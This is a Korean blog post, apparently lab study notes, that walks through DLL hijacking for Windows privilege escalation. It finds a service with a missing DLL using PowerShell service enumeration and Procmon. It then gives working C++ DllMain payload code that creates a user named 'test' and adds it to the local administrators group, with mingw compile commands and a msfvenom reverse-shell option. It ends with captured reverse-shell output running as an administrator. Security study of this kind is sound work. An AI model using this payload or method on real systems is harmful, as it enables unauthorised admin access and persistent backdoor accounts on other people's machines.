---
layout: post
title: DLL hijacking 방법
subtitle: DLL 하이잭킹 방법
category: knowledge
thumbnail-img: /assets/img/knowledge/procmon.png
tags: [knowledge, dll, hijacking, missingdll, procmon]
author: Hong
---

# dll search order

```
1. The directory from which the application loaded.
2. The system directory.
3. The 16-bit system directory.
4. The Windows directory.
5. The current directory.
6. The directories that are listed in the PATH environment variable.
```

# missing dll 찾기

필요한 dll이 없는 경우 페이로드를 dll로 꾸며서 놓으면 실행되는 점을 노린다.

아래의 명령어로 설치된 앱들의 리스트를 확인해본다.

```
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

혹은 아래의 명령어로 실행중인 앱의 리스트를 확인한다.

```
Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'}
```

그럼 아래와 같이 나오는데 이 중 관리자 권한이 아닌 폴더들의 앱을 눈여겨본다.

```
Apache2.4              Running "C:\xampp\apache\bin\httpd.exe" -k runservice
AppReadiness           Running C:\Windows\System32\svchost.exe -k AppReadiness -p
AppXSvc                Running C:\Windows\system32\svchost.exe -k wsappx -p
...
mysql                  Running C:\xampp\mysql\bin\mysqld.exe --defaults-file=c:\xampp\mysql\bin\my.ini mysql
...
Scheduler              Running "C:\Scheduler\scheduler.exe"
...
cbdhsvc_147689         Running C:\Windows\system32\svchost.exe -k ClipboardSvcGroup -p
CDPUserSvc_147689      Running C:\Windows\system32\svchost.exe -k UnistackSvcGroup
WpnUserService_147689  Running C:\Windows\system32\svchost.exe -k UnistackSvcGroup
```

Apache, Mysql, Scheduler 이 3개를 중점적으로 보면서 진행해보자.

**위 내용은 binary hijacking과도 관련이 있다. 나중에 시간이 되면 포스팅해보겠다.**

# Procmon으로 dll관련 동작을 살펴본다.

파일이 실행되면서 어떤 dll 파일을 이용하는지 보기 위해 procmon을 사용한다.

하지만 관리자 권한이 없으면 procmon을 실행 할 수 없기 때문에 확인하고 싶은 서비스를
로컬로 옮긴 후 관리자 권한이 있는 윈도우 머신에서 procmon을 실시한다.

**window - linux간의 파일 전송은 smb서버가 (impacket-smbserver) 개꿀딱**

procmon을 그냥 두면 매초 결과창이 엄청 뜨기 때문에 필터로 관심있는 프로세스를 필터링한다.

![procmon](/assets/img/knowledge/procmon.png)

scheduler를 실행하기위해 sc.exe에 태스크를 만들어서 실행시킨다.

sc에 등록하기 위해서는 관리자 권한으로 터미널을 실행해야 하니까 주의.

```
C:\Windows\system32>sc.exe create scheduler binPath= "C:\Users\offsec\desktop\scheduler.exe"
[SC] CreateService SUCCESS
```

procmon을 설정해놓고 sc로 파일을 실행하면 내용을 확인 할 수 있다.

sc에 등록해서 실행하지않고 그냥 더블클릭으로 실행하면 내용물이 달라지니 주의.

```
C:\Windows\system32>net start scheduler
The scheduler service is starting..
The scheduler service was started successfully.
```

missing dll을 찾는 경우 필터에서 result를 NAME NOT FOUND로 하면 출력물이 줄어서 발견하기 쉽다.

다음과 같이 같은 폴더에서 dll을 찾는 것을 볼 수 있다.
![missingdll](/assets/img/knowledge/missingdll.png)

이제 페이로드를 담은 dll을 만들고 파일을 실행시켜서 리버스쉘을 획득하자.

# 페이로드 작성

아래의 예제를 활용해서 원하는 페이로드를 만든다.

아래는 유저를 만들어서 관리자에 추가하고 있다.

```c++
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(
HANDLE hModule,// Handle to DLL module
DWORD ul_reason_for_call,// Reason for calling function
LPVOID lpReserved ) // Reserved
{
    switch ( ul_reason_for_call )
    {
        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
        int i;
  	    i = system ("net user test test /add");
  	    i = system ("net localgroup administrators test /add");
        break;
        case DLL_THREAD_ATTACH: // A process is creating a new thread.
        break;
        case DLL_THREAD_DETACH: // A thread exits normally.
        break;
        case DLL_PROCESS_DETACH: // A process unloads the DLL.
        break;
    }
    return TRUE;
}
```

칼리에서 컴파일해서 보내주도록 한다.

```
sudo apt-get install mingw-w64
x86_64-w64-mingw32-gcc 페이로드.cpp --shared -o 발견한dll.dll
```

아니면 그냥 msfvenom을 이용해서 리버스쉘 dll을 만들어도 괜찮다.

만든 dll파일을 원래 폴더에 옮겨두고 실행한다.

파일을 배치한 후 실행하면?

```
connect to [192.168.45.155] from (UNKNOWN) [192.168.110.191] 63345
Microsoft Windows [Version 10.0.20348.169]
(c) Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
intranet\administrator
```

리버스쉘 연결!
